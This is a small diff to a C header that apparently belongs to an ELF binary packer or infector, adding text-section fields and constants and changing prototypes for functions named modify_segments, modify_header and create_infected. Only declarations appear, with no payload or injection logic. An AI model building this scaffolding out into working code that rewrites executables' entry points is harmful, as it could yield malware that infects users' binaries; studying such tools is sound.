@@ -27,12 +27,15 @@
 
 #define X86_64 2
 
-#define PAYLOAD_SIZE 54
+#define PAYLOAD_SIZE 54 
 #define PAGE_SIZE 4096
 
 #define KEY_SIZE 16
 
 #define VOID __attribute__((unused))
+
+#define DYN_TEXT 0x8d
+#define EXEC_TEXT 0x77
 
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUM
@@ -59,10 +62,13 @@ typedef struct
 	uint32_t old_offset;
 	uint32_t new_offset;
 
-	uint32_t new_entry;
 	uint32_t old_entry;
+	uint32_t new_entry;
 
-	uint32_t v_addr;
+	uint32_t text_addr;
+	uint32_t text_offset;
+	uint32_t text_size;
+
 	uint32_t filesize;
 
 	void *ptr;
@@ -89,7 +95,7 @@ bool is_x86(t_elf const *elf);
 void *constructor(size_t const size);
 
 void modify_segments(t_elf *elf);
-void modify_sections(t_elf const *elf);
+void modify_sections(t_elf *elf);
 void modify_header(t_elf *elf);
 
 void create_infected(t_elf const *elf);
